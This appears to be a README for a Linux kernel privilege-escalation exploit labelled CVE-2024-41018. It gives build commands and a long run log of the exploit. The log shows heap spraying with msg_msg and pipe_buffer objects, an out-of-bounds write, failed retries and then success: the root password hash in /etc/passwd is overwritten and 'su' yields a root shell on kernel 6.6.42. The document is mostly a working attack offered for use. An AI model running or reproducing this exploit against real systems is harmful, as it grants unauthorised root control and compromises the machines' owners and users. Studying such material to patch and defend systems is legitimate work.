
# CVE-2024-41018

Setup:
```Bash
sudo ./setup.sh
```

Build:
```Bash
gcc exp.c -o exp -pthread -lkeyutils 
```

Exp üçª:
```
test@syzkaller:~$ ./exp
[*] Initializing env...
[*] Allocating cross-cache full k96...
[*] Allocating cross-cache pre k96...
[*] Spraying pre+reserve poll_list with holes...
[*] Waiting for making holes...
[*] Spraying post poll_list ...
[*] Triggering oobw...
sudo: unable to resolve host syzkaller: Temporary failure in name resolution
[   60.532954] systemd-journald[125]: File /var/log/journal/72dba5f076fc48e09d5d6be0fab2cd58/user-1000.journal corrupted or uncleanly shu.
[   60.641573] loop0: detected capacity change from 0 to 40961
[   60.652555] loop0: detected capacity change from 40961 to 40833
[   60.684508] ntfs3: loop0: failed to replay log file. Can't mount rw!
mount: /tmp/ntfs3: wrong fs type, bad option, bad superblock on /dev/loop0, missing codepage or helper program, or other error.
[*] Allocating post k96...
[*] Waiting for freeing by oobw...
[*] Freeing objs before/after victim...
[*] Freeing an obj per objs_per_slab...
[*] Spraying cross-cache kcg-192 msg_msg...
[*] Freeing corrupted key...
[*] Spraying cross-cache kcg-192 pipe_buffer...
[*] Checking overlap...
[*] Overlap data:
    0000  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0020  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0040  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0060  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0080  0x0000000000000000  0x0000000000000000                                           ................
[-] Overlap at start (msg_msg idx: 107)
[-] Waiting for retrying...
[-] Retry again...
[*] Allocating cross-cache full k96...
[*] Allocating cross-cache pre k96...
[*] Spraying pre+reserve poll_list with holes...
[*] Waiting for making holes...
[*] Spraying post poll_list ...
[*] Triggering oobw...
sudo: unable to resolve host syzkaller: Temporary failure in name resolution
[   84.725698] loop0: detected capacity change from 0 to 40961
[   84.736395] loop0: detected capacity change from 40961 to 40833
[   84.750786] ntfs3: loop0: failed to replay log file. Can't mount rw!
mount: /tmp/ntfs3: wrong fs type, bad option, bad superblock on /dev/loop0, missing codepage or helper program, or other error.
[*] Allocating post k96...
[*] Waiting for freeing by oobw...
[*] Freeing objs before/after victim...
[*] Freeing an obj per objs_per_slab...
[*] Spraying cross-cache kcg-192 msg_msg...
[*] Freeing corrupted key...
[*] Spraying cross-cache kcg-192 pipe_buffer...
[*] Checking overlap...
[*] Overlap data:
    0000  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0020  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0040  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0060  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0080  0x0000000000000000  0x0000000000000000                                           ................
[-] Overlap at start (msg_msg idx: 193)
[-] Waiting for retrying...
[-] Retry again...
[*] Allocating cross-cache full k96...
[*] Allocating cross-cache pre k96...
[*] Spraying pre+reserve poll_list with holes...
[*] Waiting for making holes...
[*] Spraying post poll_list ...
[*] Triggering oobw...
sudo: unable to resolve host syzkaller: Temporary failure in name resolution
[  109.171027] loop0: detected capacity change from 0 to 40961
[  109.179310] loop0: detected capacity change from 40961 to 40833
[  109.194601] ntfs3: loop0: failed to replay log file. Can't mount rw!
mount: /tmp/ntfs3: wrong fs type, bad option, bad superblock on /dev/loop0, missing codepage or helper program, or other error.
[*] Allocating post k96...
[*] Waiting for freeing by oobw...
[*] Freeing objs before/after victim...
[*] Freeing an obj per objs_per_slab...
[*] Spraying cross-cache kcg-192 msg_msg...
[*] Freeing corrupted key...
[*] Spraying cross-cache kcg-192 pipe_buffer...
[*] Checking overlap...
[*] Overlap data:
    0000  0x00000000000000dc  0x4141414141414141  0x4141414141414141  0x4141414141414141   ........AAAAAAAAAAAAAAAAAAAAAAAA
    0020  0x4141414141414141  0x4141414141414141  0xffffe55dc408f840  0x000000010000000c   AAAAAAAAAAAAAAAA@...]...........
    0040  0xffffffff95c4b8a0  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0060  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0080  0x0000000000000000  0x0000000000000000                                           ................
[*] Overlap msg_msg idx: 220
[*] Freeing overlap msg_msg...
[*] Using msg_msg to overwrite pipe...
[*] Overwrite data:
    0000  0x00000000deadbeef  0x4141414141414141  0x4141414141414141  0x4141414141414141   ........AAAAAAAAAAAAAAAAAAAAAAAA
    0020  0x4141414141414141  0x4141414141414141  0xffffe55dc408f840  0x0000000000000000   AAAAAAAAAAAAAAAA@...]...........
    0040  0xffffffff95c4b8a0  0x0000000000000010  0x0000000000000000  0x0000000000000000   ................................
    0060  0x0000000000000000  0x0000000000000000  0x0000000000000000  0x0000000000000000   ................................
    0080  0x0000000000000000  0x0000000000000000                                           ................
[*] Trying to write password...
test@syzkaller:~$ head -n 5 /etc/passwd
root:$1$rt$9jzmRkdAoL.xC6xRb6IxR1:0:0::/root:/bin/sh
sr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
test@syzkaller:~$ su
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
# uname -a
Linux syzkaller 6.6.42 #5 SMP PREEMPT_DYNAMIC Thu Jan 16 11:21:35 CST 2025 x86_64 GNU/Linux
```
